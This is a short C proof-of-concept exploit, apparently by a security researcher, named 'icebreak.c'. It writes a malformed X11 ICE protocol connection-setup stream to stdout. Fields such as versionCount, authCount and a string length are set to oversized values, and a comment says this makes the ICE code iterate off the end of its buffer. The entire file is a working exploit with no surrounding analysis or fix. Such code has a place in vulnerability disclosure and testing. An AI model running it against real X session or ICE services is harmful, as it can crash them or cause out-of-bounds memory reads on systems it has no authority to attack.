/* icebreak.c - Chris Evans */
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int
main(int argc, const char* argv[])
{
  unsigned char c;
  unsigned int i;
  unsigned short s;
  char blankbuf[1000];

  memset(blankbuf, '\0', sizeof(blankbuf));

  /* Assume fd 1 is stdout */

  /* ICE connection header */
  /* First, pick an endian-ness */
  /* Byte 1: Major opcode. Must be 0 */
  c = 0;
  write(1, &c, 1);
  /* Byte 2: Minor opcode. Must be ICE_ByteOrder (1) */
  c = 1;
  write(1, &c, 1);
  /* Byte 3: Byte-order. We'll go for IceLSBfirst (0) */
  c = 0;
  write(1, &c, 1);
  /* Byte 4: Unused. Write 0 */
  c = 0;
  write(1, &c, 1);
  /* Bytes 5-8: integer length. Must be zero for byte-order message. */
  i = 0;
  write(1, &i, 4);

  /* Next message - ICE_ConnectionSetup */
  /* Byte 1: Major opcode. 0 for core ICE protocol message */
  c = 0;
  write(1, &c, 1);
  /* Byte 2: Minor opcode. ICE_ConnectionSetup (2) */
  c = 2;
  write(1, &c, 1);
  /* Bytes 3, 4: versionCount & authCount */
  c = 255;
  write(1, &c, 1);
  write(1, &c, 1);
  /* Bytes 5-8, int length. Must be at least 8 */
  i = 8;
  write(1, &i, 4);
  /* Now, bytes are part of iceConnectionSetupMsg */
  /* This is an extra 8 bytes */
  /* Byte 1: "must authenticate" */
  c = 0;
  write(1, &c, 1);
  /* Bytes 2-8: unused */
  write(1, blankbuf, 7);

  /* Now we're writing into the malloc'ed message data space */
  /* First, a string. Give it's 16bit length a big value to get ICE code
   * to iterate off the end of the buffer
   */
  s = 65535;
  write(1, &s, 2);

  /* And some blank to get the (total) 56 char data read finished */
  write(1, blankbuf, 54);
}
